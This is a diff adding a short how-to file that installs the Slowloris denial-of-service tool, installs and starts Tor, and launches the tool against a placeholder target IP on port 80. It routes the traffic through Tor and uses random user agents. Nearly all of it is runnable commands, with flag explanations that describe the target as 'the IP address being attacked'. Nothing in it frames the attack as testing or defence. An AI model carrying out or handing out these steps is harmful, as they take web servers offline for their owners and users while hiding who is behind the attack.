@@ -1,0 +1,28 @@
+Install and Launch Slowloris
+
+
+Install Slowloris:
+#cd /usr/local/sbin
+#mkdir ./slowloris
+#cd slowloris
+#git init
+#git pull https://github.com/gkbrk/slowloris.git
+#pip3 install PySocks
+
+
+Install and run Tor:
+#apt-get update
+#apt-get install tor
+#/etc/init.d/tor start
+
+
+Launch Slowloris with Tor:
+#./slowloris.py -p 80 -v -ua -x --proxy-host 127.0.0.1 --proxy-port 9050 X.X.X.X
+Among others, here is the list showing those major parameters:
+-p: The Transport-layer port being attacked
+-v: Verbose
+-ua: Using random user agents
+-x: Enabling the proxy mode
+--proxy-host: Specifying the proxy's IP address
+--proxy-port: Specifying the proxy's Transport-layer port
+X.X.X.X: The IP address being attacked
